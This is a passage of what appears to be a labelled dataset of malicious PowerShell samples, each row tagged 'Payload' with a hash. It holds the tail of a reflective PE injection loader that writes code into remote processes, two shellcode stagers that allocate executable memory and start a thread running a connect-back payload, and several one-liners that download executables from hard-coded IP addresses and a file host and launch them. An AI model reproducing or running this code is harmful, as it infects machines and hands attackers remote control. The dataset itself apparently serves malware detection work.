                throw ""PowerShell must be same architecture (x86/x64) as PE being loaded and remote process""
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw ""PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)""
        }
        

        
        Write-Verbose ""Allocating memory for the PE and write its headers to memory""
        
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning ""PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)"" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose ""PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.""
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error ""Cannot use ForceASLR when loading in to a remote process."" -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error ""PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process"" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero              
        $EffectivePEHandle = [IntPtr]::Zero     
        if ($RemoteLoading -eq $true)
        {
            
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use""
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw ""VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).""
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        
        Write-Verbose ""Getting detailed PE information from the headers loaded in memory""
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose ""StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)""
        
        
        
        Write-Verbose ""Copy PE sections in to memory""
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        
        Write-Verbose ""Update memory addresses based on where the PE was actually loaded in memory""
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        
        Write-Verbose ""Import DLL's needed by the PE we are loading""
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose ""Update memory protection flags""
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose ""PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute""
            }
        }
        else
        {
            Write-Verbose ""PE being loaded in to a remote process, not adjusting memory permissions""
        }
        
        
        
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw ""Unable to write shellcode to remote process memory.""
            }
        }
        
        
        
        if ($PEInfo.FileType -ieq ""DLL"")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose ""Calling dllmain so the DLL knows it has been loaded""
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw ""Unable to allocate memory in the remote process for shellcode""
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw ""Unable to write shellcode to remote process memory.""
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq ""EXE"")
        {
            
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            
            
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose ""Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in.""

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose ""EXE thread has completed.""
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose ""Done unloading the libraries needed by the PE""
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        
        Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
        {
            Throw ""Can't supply a ProcId and ProcName, choose one or the other""
        }
        elseif ($ProcName -ne $null -and $ProcName -ne """")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw ""Can't find process $ProcName""
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        
        





        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw ""Couldn't obtain the handle for process ID: $ProcId""
            }
            
            Write-Verbose ""Got the handle for the remote process to inject in to""
        }
        

        
        Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw ""Unable to load PE, handle returned is NULL""
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] 
        
        
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            
            
            
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose ""Calling function with WString return type""
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""WStringFunc""
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw ""Couldn't find function address.""
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose ""Calling function with String return type""
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""StringFunc""
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw ""Couldn't find function address.""
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose ""Calling function with Void return type""
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw ""Couldn't find function address.""
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            
            
            
        }
        
        elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw ""VoidFunc couldn't be found in the DLL""
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        
        
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq ""DLL"")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
            }
        }
        
        Write-Verbose ""Done!""
    }

    Main
}


Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
    {
        $DebugPreference  = ""Continue""
    }
    
    Write-Verbose ""PowerShell ProcessID: $PID""
    
    if ($PsCmdlet.ParameterSetName -ieq ""LocalFile"")
    {
        Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
        [Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
    }
    elseif ($PsCmdlet.ParameterSetName -ieq ""WebFile"")
    {
        $WebClient = New-Object System.Net.WebClient
        
        [Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
    }
    else{
        [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEbase64)
    }
    
    
    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    
    
    $PEBytes[0] = 0
    $PEBytes[1] = 0
    
    
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = ""ReflectiveExe $ExeArgs""
    }
    else
    {
        $ExeArgs = ""ReflectiveExe""
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch ""^\s*$"")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}",Payload
90cc91e5b62400193fc301a591860ce3b25c9f1b4a8932233c6b6fbb0ecc8d7e,"
$c = '
		[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);
	';
	$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;
	[Byte[]];
	[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4a,0xc1,0xce,0xcf,0x68,0x02,0x00,0x20,0x05,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;
	$size = 0x1000;
	if ($sc.Length -gt 0x1000){
		$size = $sc.Length
	};
	$x=$w::VirtualAlloc(0,0x1000,$size,0x40);
	for ($i=0;$i -le ($sc.Length-1);$i++) {
		$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)
	};
	$w::CreateThread(0,0,$x,0,0,0);
	for (;;){
		Start-sleep 60
	};

",Payload
2e244d189d18a2d9d9eaf3b3cf9a74dea83ba68cd76dcd9afd0b81fc422db697,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xfb,0x44,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
fefa951333917fa97d95954c2bca05e0ff4af887f17a0c73e0522f256b8c5431,"
(New-Object System.Net.WebClient).DownloadFile('http://hnng.moe/f/InX',""$env:TEMP\microsoft.exe"");Start-Process (""$env:TEMP\microsoft.exe"")

",Payload
fa36856325419f6eda067e5a6d127d371c7c6ba0c41dfc36945f19cebb518b91,"
